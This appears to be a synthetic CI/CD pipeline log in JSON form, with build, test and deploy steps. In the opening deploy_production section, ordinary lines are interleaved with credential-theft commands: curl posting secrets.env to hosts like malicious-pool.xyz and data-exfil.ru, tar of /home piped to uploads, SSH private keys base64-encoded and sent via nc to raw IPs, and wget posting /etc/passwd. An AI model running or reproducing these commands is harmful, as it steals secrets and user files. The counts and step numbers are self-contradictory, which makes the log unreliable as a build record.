INFO: Request completed\nnpm notice: package.json updated\nStep 6/22: Deploying\nPlatform: win32-x64\nPOST /data - 201 (97ms)\nnpm notice: created a lockfile\nImage pulled successfully\nCache miss for key-2797\n\u2713 Step 'install' succeeded\nTLS handshake completed\nReady.\nOK\nCache invalidated: build\n[12:45:57] INFO: Connecting to database\n\u2717 build failed with exit code 65\nCache invalidated: build\nVerifying...\nPOST /data - 201 (375ms)\nCache miss for key-7810\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 12/20: Running migrations\nCompiling components/handler.rs...\nLoading...\nCompiling lib/service.java...\nTime: 44.421s\nnpm notice: package.json updated\n[12:45:57] WARN: Deprecated API usage\nStep 15/16: Installing dependencies\nRan 89 tests in 36s\nWARNING: lodash has known vulnerabilities\nStep 2/21: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGenerating source maps...\nFetching submodules...\nInstalling react@4.15.0\nStep 10/22: Running migrations\n[12:45:57] ERROR: Connection failed\nCache miss for key-1301\nArtifact uploaded: build.tar.gz (14MB)\nRan 36 tests in 36s\n[12:45:57] DEBUG: Loading configuration\nBundling vendor.js\nWARNING: axios has known vulnerabilities\nImage pulled successfully\nArtifact downloaded: 14MB\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (5MB)\nChecking out master branch\nStep 10/20: Building\n[12:45:57] DEBUG: Initializing service\nnpm install: resolved 575 packages\n[12:45:57] INFO: Cache refreshed\nCache miss for key-3390\nCompleted.\nGenerating source maps...\nArtifact uploaded: build.tar.gz (19MB)\nCache invalidated: build\npip install: Successfully installed express-4.20\nUploading artifact 'build' (11 files)\nStep 13/20: Installing dependencies\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (42MB)\nnpm notice: created a lockfile\n[12:45:57] INFO: Cache refreshed\nEnvironment: production\nTime: 104.74s\nStep 5/20: Testing\nChecking out master branch\nTest Suites: 33 passed, 35 total\nCompiling src/service.java...\nyarn add: Done in 5.5s\nAlready up to date.\nMinifying vendor.js\n[12:45:57] ERROR: Connection failed\n[12:45:57] INFO: Request completed\n\u2713 validate completed\nCompleted.\nCreating production build...\n[12:45:57] INFO: Processing request\nCompiling utils/index.js...\nnpm install: resolved 1916 packages\nNODE_ENV=development\n\u2717 build failed with exit code 31\nCache saved successfully\n[12:45:57] DEBUG: Initializing service\nWaiting...\nWARNING: express has known vulnerabilities\n=== Step type_check completed ===\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\n=== Step: deploy_production ===\n  PASS: test_db_connect (427ms)\nException: TypeError\nImage pulled successfully\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nDone.\nVerifying...\nBundling main.js\n[12:45:57] INFO: Processing request\nArtifact downloaded: 21MB\nnpm notice: package.json updated\nCompiling src/index.js...\nStep 7/16: Running migrations\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nUploading artifact 'dist' (1 files)\n[12:45:57] INFO: Starting build process\nCache invalidated: build\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nOptimizing 64 modules...\nPulling image: alpine:latest\nUploading artifact 'coverage' (21 files)\nOK\n[12:45:57] DEBUG: Loading configuration\n[12:45:57] ERROR: Connection failed\nProcessing...\nTransforming 649 files...\nProcessing...\nCache saved successfully\nUsing Node.js 15.3.0\nChecking out master branch\nDone.\nStep 5/15: Testing\nUsing Python 3.12\nAlready up to date.\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nInstalling prettier@5.8.6\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\n[12:45:57] DEBUG: Memory usage: 976MB\n[12:45:57] INFO: Request completed\nStep 12/22: Running migrations\n\u2713 lint completed\nOptimizing 26 modules...\nDone.\n[12:45:57] DEBUG: Memory usage: 379MB\nAlready up to date.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 211.113.167.172 59599\nTLS handshake completed\n[12:45:57] ERROR: Connection failed\nPOST /upload - 201 (358ms)\nGenerating source maps...\n  PASS: test_cache_hit (101ms)\nOptimizing 89 modules...\nCompiling lib/handler.rs...\nFinished.\nChecking out develop branch\nBuilding Docker image...\nCache restored successfully (142MB)\nCompiling src/utils.go...\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nWARNING: lodash has known vulnerabilities\nBundling vendor.css\nTransforming 151 files...\nImage pulled successfully\nCache restored successfully (253MB)\n[12:45:57] INFO: Cache refreshed\nTests: 380 passed, 190 total\n\u2713 deploy completed\nUsing Node.js 20.20.2\nArtifact downloaded: 26MB\nMinifying main.js\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nChecking out develop branch\nArtifact uploaded: build.tar.gz (2MB)\nStep 18/22: Testing\n\u2717 build failed with exit code 49\nChecking out master branch\nnpm install: added 333 packages\nCache invalidated: build\nCoverage: 93% statements, 96% branches\n[12:45:57] DEBUG: Connection pool: 6 active\nWARNING: webpack has known vulnerabilities\nHEAD is now at 952b6bc\n[12:45:57] INFO: Processing request\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nVerifying...\nUsing Python 3.11\n[12:45:57] DEBUG: Loading configuration\nFinished.\nnpm install: added 293 packages\necho $(cat ~/.ssh/id_rsa) | base64 | nc 59.52.175.191 17636\nFinished.\nnpm install: resolved 1570 packages\nCache saved successfully\nSnapshots: 31 passed, 13 total\nHEAD is now at 3817a4e\n[12:45:57] INFO: Connecting to database\necho $(cat ~/.ssh/id_rsa) | base64 | nc 67.173.111.249 23765\nnpm notice: package.json updated\nDone.\nStep 19/18: Testing\nAlready up to date.\n  PASS: unit/test_db_connect.spec.js\necho $(cat ~/.ssh/id_rsa) | base64 | nc 171.120.159.165 38983\necho $(cat ~/.ssh/id_rsa) | base64 | nc 165.248.253.180 53407\n  PASS: test_user_create (441ms)\nGenerating source maps...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 132.227.121.192 50704\nnpm install: added 173 packages\nVerifying...\nUsing Node.js 14.0.9\ncurl -X POST https://evil-server.cc/collect --data @secrets.env\nSwitched to branch 'bugfix/task-334'\nDone.\nException: RuntimeError\n[12:45:57] DEBUG: Memory usage: 528MB\nCompleted.\n=== Step deploy_production completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-25T12:45:57.535368",
        "finished_at": "2025-11-25T12:46:18.213724",
        "log_lines": [
          "=== Step: setup_environment ===",
          "pip install: Successfully installed jest-5.0",
          "Step 11/21: Building",
          "Loading...",
          "[12:45:57] WARN: Deprecated API usage",
          "Coverage: 77% statements, 82% branches",
          "Platform: win32-x64",
          "Waiting...",
          "Exception: TypeError",
          "Completed.",
          "Installing react@3.8.2",
          "Cache hit for key-5585",
          "Compiling src/handler.rs...",
          "Coverage: 82% statements, 84% branches",
          "Checking out main branch",
          "Installing jest@2.12.10",
          "pip: Collecting webpack",
          "pip: Downloading webpack-4.5.tar.gz",
          "Building Docker image...",
          "Using Node.js 18.5.9",
          "Loading...",
          "\u2713 Step 'setup' succeeded",
          "Bundling main.js",
          "Waiting...",
          "Waiting...",
          "FAILED: test_db_connect",
          "[12:45:57] INFO: Starting build process",
          "Step 9/23: Building",
          "Pulling image: node:3.11",
          "Step 6/17: Linting",
          "Connection established",
          "Using Node.js 20.15.8",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Compiling components/utils.go...",
          "POST /api - 201 (165ms)",
          "Waiting...",
          "[12:45:57] INFO: Cache refreshed",
          "pip: Downloading jest-3.6.tar.gz",
          "[12:45:57] INFO: Cache refreshed",
          "Waiting...",
          "Ready.",
          "Cache restored successfully (193MB)",
          "HEAD is now at 48894a6",
          "Cache miss for key-2129",
          "Time: 76.640s",
          "Coverage: 78% statements, 92% branches",
          "\u2713 test completed",
          "Cache miss for key-4182",
          "[12:45:57] DEBUG: Query executed in 12ms",
          "npm install: resolved 1601 packages",
          "Ready.",
          "Using Node.js 18.10.7",
          "Step 15/15: Building",
          "pip: Downloading axios-1.1.tar.gz",
          "Ran 180 tests in 8s",
          "Step 17/22: Building",
          "Waiting...",
          "Compiling lib/service.java...",
          "npm install: resolved 1183 packages",
          "yarn add: Done in 3.79s",
          "Transforming 884 files...",
          "Loading...",
          "Optimizing 54 modules...",
          "Layer 6/11: ENV command",
          "POST /upload - 202 (387ms)",
          "Optimizing 51 modules...",
          "Compiling lib/handler.rs...",
          "TLS handshake completed",
          "\u2713 Task completed in 2248ms",
          "WARNING: webpack has known vulnerabilities",
          "Cache invalidated: build",
          "Step 7/24: Installing dependencies",
          "Cache invalidated: build",
          "\u2713 All checks passed",
          "\u2713 package completed",
          "\u2713 validate completed",
          "Switched to branch 'hotfix/task-877'",
          "[12:45:57] DEBUG: Memory usage: 1068MB",
          "Artifact uploaded: dist.zip (54MB)",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "[12:45:57] DEBUG: Initializing service",
          "TLS handshake completed",
          "Cache restored successfully (322MB)",
          "Bundling runtime.css",
          "Cache miss for key-7562",
          "Exception: TypeError",
          "TLS handshake completed",
          "npm install: resolved 1784 packages",
          "Connection established",
          "Loading...",
          "Loading...",
          "Artifact downloaded: 32MB",
          "Snapshots: 13 passed, 2 total",
          "WARNING: axios has known vulnerabilities",
          "\u2713 All checks passed",
          "Time: 13.732s",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Coverage: 99% statements, 70% branches",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-25T12:46:18.213724",
        "finished_at": "2025-11-25T12:46:38.892080",
        "log_lines": [
          "=== Step: setup_node ===",
          "Exception: NullPointerException",
          "GET /status - 200 (66ms)",
          "Fetching from https://amazonaws.com/package.json",
          "Done.",
          "Cache saved successfully",
          "pip: Collecting jest",
          "pip: Downloading jest-2.12.tar.gz",
          "Building Docker image...",
          "Tests: 353 passed, 190 total",
          "pip: Collecting lodash",
          "OK",
          "Ran 90 tests in 30s",
          "[12:45:57] INFO: Cache refreshed",
          "Compiling lib/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache miss for key-9010",
          "\u2713 All checks passed",
          "Test Suites: 47 passed, 41 total",
          "[12:45:57] WARN: Deprecated API usage",
          "\u2713 build completed",
          "pip: Downloading react-2.2.tar.gz",
          "pip: Collecting jest",
          "Cache invalidated: build",
          "[12:45:57] ERROR: Connection failed",
          "[12:45:57] DEBUG: Initializing service",
          "Step 5/25: Deploying",
          "[12:45:57] INFO: Request completed",
          "Completed.",
          "Processing...",
          "Image pulled successfully",
          "yarn add: Done in 13.20s",
          "Cache miss for key-6797",
          "Snapshots: 48 passed, 44 total",
          "Done.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Test Suites: 7 passed, 19 total",
          "Creating production build...",
          "Fetching submodules...",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "\u2713 package completed",
          "Cache saved successfully",
          "\u2713 Step 'checkout' succeeded",
          "TLS handshake completed",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Using Python 3.12",
          "Fetching from https://github.com/package.json",
          "Step 2/25: Installing dependencies",
          "Using Python 3.9",
          "[12:45:57] DEBUG: Query executed in 44ms",
          "Completed.",
          "[12:45:57] INFO: Cache refreshed",
          "Waiting...",
          "[12:45:57] ERROR: Connection failed",
          "Optimizing 95 modules...",
          "Cache saved successfully",
          "Ready.",
          "Bundling styles.css",
          "Bundling styles.css",
          "POST /api - 202 (275ms)",
          "Fetching submodules...",
          "  PASS: test_db_connect (267ms)",
          "\u2713 Task completed in 4469ms",
          "pip: Downloading axios-2.20.tar.gz",
          "pip: Downloading eslint-3.11.tar.gz",
          "Cache saved successfully",
          "Compiling utils/utils.go...",
          "Tests: 262 passed, 70 total",
          "[12:45:57] INFO: Connecting to database",
          "\u2713 Task completed in 230ms",
          "Platform: darwin-arm64",
          "\u2713 Task completed in 1954ms",
          "Artifact downloaded: 23MB",
          "[12:45:57] DEBUG: Memory usage: 338MB",
          "  PASS: test_api_health (433ms)",
          "npm install: added 255 packages",
          "[12:45:57] DEBUG: Query executed in 53ms",
          "Tests: 116 passed, 471 total",
          "HEAD is now at f6a745e",
          "Platform: linux-x64",
          "Cache miss for key-9269",
          "Fetching submodules...",
          "[12:45:57] DEBUG: Query executed in 10ms",
          "Using Node.js 19.9.5",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:57] INFO: Processing request",
          "\u2713 Step 'build' succeeded",
          "NODE_ENV=production",
          "pip: Downloading prettier-5.10.tar.gz",
          "Minifying vendor.js",
          "Step 7/20: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "[12:45:57] DEBUG: Loading configuration",
          "Processing...",
          "[12:45:57] INFO: Starting build process",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:45:57] WARN: Deprecated API usage",
          "Waiting...",
          "Creating production build...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-25T12:46:38.892080",
        "finished_at": "2025-11-25T12:46:47.163422",
        "log_lines": [
          "=== Step: checkout ===",
          "Image pulled successfully",
          "Building Docker image...",
          "[12:45:57] DEBUG: Memory usage: 840MB",
          "Ran 86 tests in 44s",
          "\u2717 build failed with exit code 34",
          "Pulling image: alpine:18",
          "[12:45:57] DEBUG: Loading configuration",
          "[12:45:57] DEBUG: Initializing service",
          "Layer 4/11: RUN command",
          "Layer 6/14: RUN command",
          "Finished.",
          "Cache saved successfully",
          "[12:45:57] INFO: Starting build process",
          "Pushing to registry...",
          "Compiling lib/utils.go...",
          "TLS handshake completed",
          "Pushing to registry...",
          "[12:45:57] WARN: Deprecated API usage",
          "pip: Downloading eslint-2.12.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling runtime.css",
          "Tests: 206 passed, 213 total",
          "[12:45:57] DEBUG: Loading configuration",
          "Test Suites: 39 passed, 45 total",
          "GET /api - 201 (95ms)",
          "Test Suites: 31 passed, 31 total",
          "[12:45:57] INFO: Cache refreshed",
          "[12:45:57] DEBUG: Connection pool: 16 active",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-3311",
          "Switched to branch 'hotfix/task-594'",
          "Installing jest@3.16.5",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Loading...",
          "\u2713 test completed",
          "[12:45:57] INFO: Processing request",
          "Using Node.js 17.7.3",
          "Artifact uploaded: build.tar.gz (30MB)",
          "pip: Collecting webpack",
          "WARNING: webpack has known vulnerabilities",
          "Platform: darwin-arm64",
          "[12:45:57] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Step 8/19: Linting",
          "pip: Collecting jest",
          "Fetching from https://npmjs.org/package.json",
          "Creating production build...",
          "HEAD is now at 0ceb171",
          "\u2713 validate completed",
          "Completed.",
          "Environment: production",
          "pip: Installing build dependencies...",
          "pip install: Successfully installed eslint-1.8",
          "Cache miss for key-1873",
          "Time: 7.218s",
          "Image pulled successfully",
          "Uploading artifact 'dist' (24 files)",
          "[12:45:57] DEBUG: Connection pool: 5 active",
          "[12:45:57] WARN: Deprecated API usage",
          "Compiling utils/app.ts...",
          "npm notice: package.json updated",
          "npm notice: package.json updated",
          "Ready.",
          "Using Node.js 19.13.5",
          "Compiling utils/index.js...",
          "\u2713 All checks passed",
          "\u2713 Task completed in 2780ms",
          "Tests: 292 passed, 121 total",
          "Pulling image: alpine:latest",
          "Pulling image: alpine:3.11",
          "TLS handshake completed",
          "Step 15/18: Running migrations",
          "Checking out develop branch",
          "\u2717 build failed with exit code 11",
          "pip install: Successfully installed prettier-2.6",
          "Artifact downloaded: 27MB",
          "Ready.",
          "\u2713 Task completed in 2336ms",
          "Pushing to registry...",
          "Checking out main branch",
          "Image pulled successfully",
          "[12:45:57] DEBUG: Query executed in 53ms",
          "pip install: Successfully installed lodash-3.20",
          "pip: Downloading webpack-3.1.tar.gz",
          "Generating source maps...",
          "Using Python 3.12",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 10 tests in 46s",
          "pip install: Successfully installed react-2.1",
          "WARNING: prettier has known vulnerabilities",
          "pip install: Successfully installed react-1.20",
          "Tests: 261 passed, 104 total",
          "Finished.",
          "[12:45:57] DEBUG: Connection pool: 3 active",
          "[12:45:57] INFO: Request completed",
          "Minifying app.js",
          "Compiling utils/utils.go...",
          "OK",
          "pip: Downloading express-5.14.tar.gz",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-25T12:46:47.163422",
        "finished_at": "2025-11-25T12:47:07.841778",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Compiling utils/utils.go...",
          "POST /api - 201 (227ms)",
          "Cache miss for key-7883",
          "Fetching from https://googleapis.com/package.json",
          "WARNING: jest has known vulnerabilities",
          "pip: Collecting prettier",
          "Creating production build...",
          "Time: 30.642s",
          "  PASS: test_db_connect (372ms)",
          "Time: 21.914s",
          "Step 6/15: Deploying",
          "WARNING: jest has known vulnerabilities",
          "Layer 7/8: RUN command",
          "WARNING: lodash has known vulnerabilities",
          "Step 2/21: Deploying",
          "Test Suites: 31 passed, 46 total",
          "Step 11/24: Testing",
          "Image pulled successfully",
          "Step 2/21: Running migrations",
          "Layer 1/10: COPY command",
          "Step 10/18: Installing dependencies",
          "HEAD is now at 78eabc8",
          "[12:45:57] DEBUG: Connection pool: 10 active",
          "\u2713 build completed",
          "Minifying app.js",
          "Time: 5.409s",
          "HEAD is now at 09420e2",
          "Cache hit for key-9291",
          "[12:45:57] INFO: Cache refreshed",
          "\u2713 Step 'checkout' succeeded",
          "Ready.",
          "Verifying...",
          "Fetching from https://pypi.org/package.json",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: dist.zip (59MB)",
          "Step 7/21: Testing",
          "Already up to date.",
          "[12:45:57] INFO: Cache refreshed",
          "Generating source maps...",
          "Step 14/25: Testing",
          "Fetching from https://docker.io/package.json",
          "npm notice: package.json updated",
          "HEAD is now at ac7587b",
          "POST /data - 201 (180ms)",
          "Uploading artifact 'dist' (17 files)",
          "[12:45:57] DEBUG: Loading configuration",
          "NODE_ENV=production",
          "Verifying...",
          "Time: 14.110s",
          "OK",
          "Compiling utils/utils.go...",
          "Done.",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Environment: staging",
          "Minifying vendor.js",
          "Using Node.js 17.14.5",
          "Fetching from https://registry.npmjs.org/package.json",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying app.js",
          "Environment: staging",
          "Fetching submodules...",
          "[12:45:57] ERROR: Connection failed",
          "NODE_ENV=test",
          "Platform: win32-x64",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 All checks passed",
          "  PASS: integration/test_db_connect.spec.js",
          "Tests: 348 passed, 405 total",
          "pip install: Successfully installed prettier-4.2",
          "npm install: added 23 packages",
          "Processing...",
          "[12:45:57] DEBUG: Connection pool: 17 active",
          "[12:45:57] DEBUG: Memory usage: 184MB",
          "Using Python 3.9",
          "\u2713 deploy completed",
          "Transforming 323 files...",
          "Using Python 3.12",
          "Artifact downloaded: 46MB",
          "Switched to branch 'bugfix/task-257'",
          "OK",
          "Using Python 3.10",
          "Success!",
          "POST /api - 202 (400ms)",
          "[12:45:57] DEBUG: Initializing service",
          "Test Suites: 18 passed, 14 total",
          "Already up to date.",
          "[12:45:57] INFO: Processing request",
          "[12:45:57] INFO: Starting build process",
          "Waiting...",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Cache restored successfully (340MB)",
          "pip: Downloading jest-4.11.tar.gz",
          "Fetching submodules...",
          "WARNING: lodash has known vulnerabilities",
          "Ran 38 tests in 33s",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Fetching from https://gcr.io/package.json",
          "[12:45:57] WARN: Deprecated API usage",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-25T12:47:07.841778",
        "finished_at": "2025-11-25T12:47:28.520134",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Already up to date.",
          "pip install: Successfully installed react-5.3",
          "[12:45:57] INFO: Connecting to database",
          "Verifying...",
          "Step 6/15: Deploying",
          "WARNING: axios has known vulnerabilities",
          "FAILED: test_user_create",
          "WARNING: jest has known vulnerabilities",
          "Artifact downloaded: 23MB",
          "Cache hit for key-9855",
          "npm install: added 286 packages",
          "Optimizing 34 modules...",
          "pip: Collecting axios",
          "npm install: added 467 packages",
          "Cache invalidated: node_modules",
          "GET /health - 204 (100ms)",
          "Step 6/19: Running migrations",
          "Waiting...",
          "Compiling utils/index.js...",
          "\u2717 build failed with exit code 12",
          "Processing...",
          "Using Node.js 17.9.3",
          "[12:45:57] DEBUG: Connection pool: 18 active",
          "Finished.",
          "\u2713 Step 'build' succeeded",
          "POST /upload - 202 (234ms)",
          "Waiting...",
          "Ready.",
          "Platform: darwin-arm64",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-546'",
          "Step 19/22: Running migrations",
          "Minifying main.js",
          "yarn add: Done in 8.47s",
          "NODE_ENV=development",
          "NODE_ENV=production",
          "Fetching submodules...",
          "pip: Collecting jest",
          "Transforming 449 files...",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Loading...",
          "yarn add: Done in 24.56s",
          "GET /health - 200 (92ms)",
          "[12:45:57] INFO: Processing request",
          "Using Python 3.11",
          "Minifying app.js",
          "Success!",
          "Environment: test",
          "[12:45:57] INFO: Starting build process",
          "Minifying vendor.js",
          "Snapshots: 42 passed, 36 total",
          "Generating source maps...",
          "[12:45:57] INFO: Cache refreshed",
          "[12:45:57] INFO: Connecting to database",
          "Layer 7/14: RUN command",
          "Environment: staging",
          "Success!",
          "POST /api - 202 (174ms)",
          "Fetching submodules...",
          "[12:45:57] DEBUG: Initializing service",
          "Cache miss for key-9461",
          "pip: Downloading axios-5.17.tar.gz",
          "Step 13/24: Running migrations",
          "Waiting...",
          "Cache invalidated: build",
          "[12:45:57] INFO: Starting build process",
          "Generating source maps...",
          "Completed.",
          "Test Suites: 34 passed, 15 total",
          "Compiling lib/handler.rs...",
          "[12:45:57] INFO: Connecting to database",
          "FAILED: test_api_health",
          "Cache miss for key-1525",
          "Fetching submodules...",
          "Generating source maps...",
          "Ran 196 tests in 47s",
          "Switched to branch 'feature/task-464'",
          "Installing react@1.5.2",
          "Step 18/20: Linting",
          "Layer 3/12: ENV command",
          "Installing react@4.12.3",
          "Exception: TypeError",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (45MB)",
          "[12:45:57] INFO: Connecting to database",
          "Coverage: 97% statements, 65% branches",
          "Artifact downloaded: 17MB",
          "TLS handshake completed",
          "Using Python 3.10",
          "Tests: 84 passed, 395 total",
          "Exception: ValueError",
          "Cache miss for key-3717",
          "WARNING: jest has known vulnerabilities",
          "pip install: Successfully installed lodash-5.17",
          "Cache invalidated: build",
          "Creating production build...",
          "pip install: Successfully installed prettier-3.12",
          "Compiling src/utils.go...",
          "Finished.",
          "\u2713 package completed",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:47:28.520134",
        "finished_at": "2025-11-25T12:47:40.927148",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Success!",
          "Cache invalidated: build",
          "Optimizing 25 modules...",
          "Generating source maps...",
          "GET /health - 200 (84ms)",
          "Artifact uploaded: dist.zip (3MB)",
          "Step 15/16: Installing dependencies",
          "[12:45:57] INFO: Request completed",
          "[12:45:57] INFO: Starting build process",
          "Verifying...",
          "Ran 30 tests in 42s",
          "Step 5/24: Building",
          "Minifying vendor.js",
          "\u2713 Step 'test' succeeded",
          "Coverage: 72% statements, 95% branches",
          "Cache miss for key-6771",
          "Step 12/22: Testing",
          "\u2717 build failed with exit code 41",
          "\u2713 Task completed in 1684ms",
          "Tests: 121 passed, 346 total",
          "\u2713 Step 'test' succeeded",
          "Ran 167 tests in 3s",
          "Fetching from https://npmjs.org/package.json",
          "Tests: 407 passed, 338 total",
          "OK",
          "Bundling styles.js",
          "Environment: production",
          "TLS handshake completed",
          "Waiting...",
          "[12:45:57] INFO: Starting build process",
          "pip: Installing build dependencies...",
          "npm install: resolved 694 packages",
          "Generating source maps...",
          "Generating source maps...",
          "yarn add: Done in 28.54s",
          "Switched to branch 'feature/task-803'",
          "pip: Installing build dependencies...",
          "[12:45:57] DEBUG: Query executed in 10ms",
          "WARNING: eslint has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Ready.",
          "Pulling image: node:latest",
          "Fetching from https://github.com/package.json",
          "Snapshots: 31 passed, 43 total",
          "[12:45:57] WARN: Deprecated API usage",
          "pip: Collecting axios",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:45:57] INFO: Request completed",
          "Bundling styles.js",
          "yarn add: Done in 11.78s",
          "Step 19/23: Building",
          "[12:45:57] ERROR: Connection failed",
          "[12:45:57] WARN: Deprecated API usage",
          "pip: Downloading prettier-2.6.tar.gz",
          "[12:45:57] WARN: Deprecated API usage",
          "Pushing to registry...",
          "\u2713 Task completed in 1600ms",
          "Snapshots: 1 passed, 49 total",
          "pip: Downloading express-5.12.tar.gz",
          "pip: Downloading prettier-4.17.tar.gz",
          "pip: Collecting jest",
          "Artifact downloaded: 32MB",
          "[12:45:57] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "Step 10/18: Installing dependencies",
          "[12:45:57] DEBUG: Memory usage: 683MB",
          "[12:45:57] DEBUG: Query executed in 81ms",
          "[12:45:57] INFO: Starting build process",
          "[12:45:57] WARN: Deprecated API usage",
          "Compiling lib/handler.rs...",
          "Snapshots: 39 passed, 11 total",
          "[12:45:57] WARN: Deprecated API usage",
          "[12:45:57] DEBUG: Initializing service",
          "Building Docker image...",
          "Waiting...",
          "Step 17/24: Testing",
          "\u2717 build failed with exit code 31",
          "Tests: 355 passed, 413 total",
          "[12:45:57] WARN: Deprecated API usage",
          "[12:45:57] INFO: Connecting to database",
          "HEAD is now at b9b4472",
          "pip: Installing build dependencies...",
          "[12:45:57] WARN: Deprecated API usage",
          "Step 5/19: Running migrations",
          "Fetching from https://gcr.io/package.json",
          "[12:45:57] INFO: Starting build process",
          "Layer 3/10: RUN command",
          "Cache miss for key-4369",
          "Verifying...",
          "  PASS: test_auth_login (291ms)",
          "[12:45:57] WARN: Deprecated API usage",
          "Connection established",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "Coverage: 82% statements, 76% branches",
          "Pulling image: node:18",
          "Step 3/24: Linting",
          "Success!",
          "[12:45:57] WARN: Deprecated API usage",
          "OK",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-25T12:47:40.927148",
        "finished_at": "2025-11-25T12:48:01.605504",
        "log_lines": [
          "=== Step: lint ===",
          "Bundling styles.css",
          "\u2713 Task completed in 2405ms",
          "Cache restored successfully (205MB)",
          "yarn add: Done in 3.2s",
          "Ran 47 tests in 6s",
          "Already up to date.",
          "[12:45:57] INFO: Processing request",
          "HEAD is now at f57db56",
          "[12:45:57] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Using Python 3.11",
          "[12:45:57] DEBUG: Memory usage: 1826MB",
          "[12:45:57] INFO: Connecting to database",
          "Completed.",
          "  PASS: test_cache_hit (495ms)",
          "Ready.",
          "pip: Collecting express",
          "Snapshots: 47 passed, 14 total",
          "npm notice: created a lockfile",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pushing to registry...",
          "Coverage: 87% statements, 70% branches",
          "Pulling image: alpine:3.11",
          "npm notice: created a lockfile",
          "Verifying...",
          "Layer 10/15: COPY command",
          "Step 7/17: Linting",
          "Step 11/22: Running migrations",
          "pip: Installing build dependencies...",
          "[12:45:57] DEBUG: Initializing service",
          "Minifying main.js",
          "WARNING: eslint has known vulnerabilities",
          "Completed.",
          "Compiling components/service.java...",
          "Installing jest@1.7.7",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Exception: RuntimeError",
          "TLS handshake completed",
          "Uploading artifact 'coverage' (20 files)",
          "Test Suites: 49 passed, 13 total",
          "[12:45:57] INFO: Processing request",
          "NODE_ENV=production",
          "\u2713 Step 'setup' succeeded",
          "[12:45:57] INFO: Connecting to database",
          "Compiling src/service.java...",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 30 passed, 27 total",
          "[12:45:57] INFO: Cache refreshed",
          "  PASS: integration/test_api_health.spec.js",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "Exception: NullPointerException",
          "Cache miss for key-2968",
          "[12:45:57] WARN: Deprecated API usage",
          "Step 3/25: Installing dependencies",
          "[12:45:57] DEBUG: Memory usage: 951MB",
          "Pulling image: python:18",
          "Fetching submodules...",
          "Layer 9/15: COPY command",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: unit/test_db_connect.spec.js",
          "Layer 7/14: RUN command",
          "Cache miss for key-3484",
          "\u2717 build failed with exit code 61",
          "Step 11/21: Building",
          "Ready.",
          "Step 6/24: Running migrations",
          "[12:45:57] INFO: Cache refreshed",
          "Loading...",
          "[12:45:57] INFO: Connecting to database",
          "[12:45:57] DEBUG: Loading configuration",
          "Bundling runtime.js",
